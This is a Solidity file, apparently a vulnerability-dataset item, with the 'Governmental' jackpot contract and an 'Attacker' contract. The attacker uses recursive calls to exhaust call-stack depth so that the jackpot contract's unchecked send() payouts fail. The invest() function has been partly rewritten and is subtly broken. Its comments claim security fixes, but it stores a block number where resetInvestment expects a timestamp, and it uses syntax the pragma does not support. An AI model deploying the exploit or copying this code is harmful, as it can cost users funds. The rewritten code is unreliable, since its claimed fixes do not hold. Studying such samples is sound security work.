/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental
 * @author: -
 * @vulnerable_at_lines: 27
 */

//added pragma version
pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() public payable {
    require(msg.value >= jackpot / 2, "Investment must be at least half of jackpot");
    
    // Move state changes before external interactions (if any) to prevent reentrancy
    uint256 previousJackpot = jackpot;
    address previousLastInvestor = lastInvestor;
    uint256 previousTimestamp = lastInvestmentTimestamp;
    
    // Store the reward amount for previous investor (if this pattern is needed)
    uint256 rewardForPrevious = msg.value / 2;
    
    // Update state variables
    jackpot = previousJackpot + rewardForPrevious;
    lastInvestor = msg.sender;
    
    // Use block.timestamp only for informational purposes, not for critical logic
    // Add a cooldown period or use block numbers for time-based logic if needed
    lastInvestmentTimestamp = block.number; // Using block number instead of timestamp for critical logic
    
    // Send reward to previous investor if needed (example pattern)
    if (previousLastInvestor != address(0)) {
        previousLastInvestor.transfer(rewardForPrevious);
    }
}

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
